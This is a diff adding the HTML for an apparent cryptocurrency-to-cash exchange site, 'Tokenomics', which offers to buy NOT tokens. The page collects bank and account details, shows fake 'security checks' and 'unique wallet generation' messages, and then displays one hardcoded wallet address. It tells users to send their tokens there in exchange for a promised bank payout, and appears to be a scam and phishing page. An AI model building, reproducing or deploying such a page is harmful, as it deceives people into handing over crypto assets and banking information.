@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tokenomics</title>
+</head>
+<body>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="new.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+    <div class="tokdiv">
+    <img style="border-radius: 5px;" src="images/logo.jpeg" height="70" width="105" alt="">
+    <h1 style="text-align: center; margin-top: -1px;">Tokenomics</h1>
+    </div>
+    <p style="font-family: monospace; padding: 5px; margin-top: -7px; font-size: 0.7rem; margin-left: 5px; text-align: center;">The fastest way to convert Cryptocurrencies into Cash</p>
+    
+    <div class="center">
+   
+        
+        <img class="img" id="one" style="border-radius: 50%; border: 2px solid white;" src="images/ton.png" height="125" width="130" alt="">
+    
+    </div>
+    <div style="display: none;" class="now">
+        <div id="spin"></div>
+    </div>
+    
+    
+   
+     <div class="form-container">
+        <h2 style="color: #00ffff;">Sell NOT Tokens / <span style="color: #9aff40; font-family: monospace;">$0.017</span></h2>
+        <form>
+            <label for="country">Country:</label>
+            <input type="text" id="name" name="name" required>
+
+          
+
+            <label for="bank">Bank:</label>
+            <input type="text" id="bank" name="bank" required>
+
+            <label for="account">Account Number/Bank ID:</label>
+            <input type="text" id="account" name="account" required>
+            <label for="amount">NOT Token Amount:</label>
+            <input type="number" id="amount" name="amount" step="0.01" required>
+
+            <input id="submit" type="submit" value="proceed">
+        </form>
+    </div>
+    <div class="center"> 
+        <div class="blink">
+            
+        </div>
+    </div>
+    <h2 id="processing" style="color: #2beaff; text-align: center; font-family: monospace; display: none;">PROCESSING...</h2>
+     <h2 id="running" style="color: #2beaff; text-align: center; font-family: monospace; display: none;">RUNNING SECURITY CHECKS...</h2>
+      <h2 id="generating" style="color: #2beaff; text-align: center; font-family: monospace; display: none;">GENERATING UNIQUE EXCHANGE WALLET ADDRESS...</h2>
+       <div style="display: none;" id="completed">
+      <div id="complete">
+          
+       <h2 style="color: #70ff15; text-align: center; font-family: monospace;">COMPLETED</h2>
+    
+        <p style="color: #00ffea; font-size: 1rem; font-family: monospace; font-weight: bold; padding: 5px; text-align: center;">0x7807e37da345fcc86d4ac46fb483330d5eafc9a2</p>
+        
+        <i style="color: white; margin-top: 30px; font-size: 40px;" id="icon" class="fa-solid fa-arrow-up-from-bracket"></i>
+        <p style="text-align: center;">The above wallet will be used to receive your NOT Tokens. To complete the transaction, follow the steps:</p>
+        <ul>
+            <li>Copy the wallet address above.</li>
+            <li>Open your wallet where your Token is stored.</li>
+            <li>Find the option to send Tokens.</li>
+            <li>Paste the wallet address and send the Token amount.</li>
+            <li>Upon confirmation of Token in our company's wallet, the dollar equivalent will be automatically sent to your local bank. Conversion to your local currency will be done by your bank immediately.</li>
+            <li>First two confirmed transactions from same IP is free and without gas fees.</li>
+            <li style="font-weight: bold;">THANK YOU FOR TRUSTING US. WE HOPE TO HAVE MORE TRANSACTIONS WITH YOU SOON!</li>
+        </ul>
+    </div>
+    </div>
+    
+    <footer>
+        <div style="margin-bottom: 20px; width: 70%;" class="tokdiv">
+    <img style="border-radius: 5px;" src="images/logo.jpeg" height="75" width="125" alt="">
+    <h2 style="text-align: center;">Tokenomics</h2>
+    </div>
+        <p>Making the world smarter, happier and richer.</p>
+        <p> &copy 2019 - 2024 Tokenomics. All Rights Reserved</p>
+    </footer>
+</body>
+<script src="app.js"></script>
+</html>
+
+
+
+
+
+
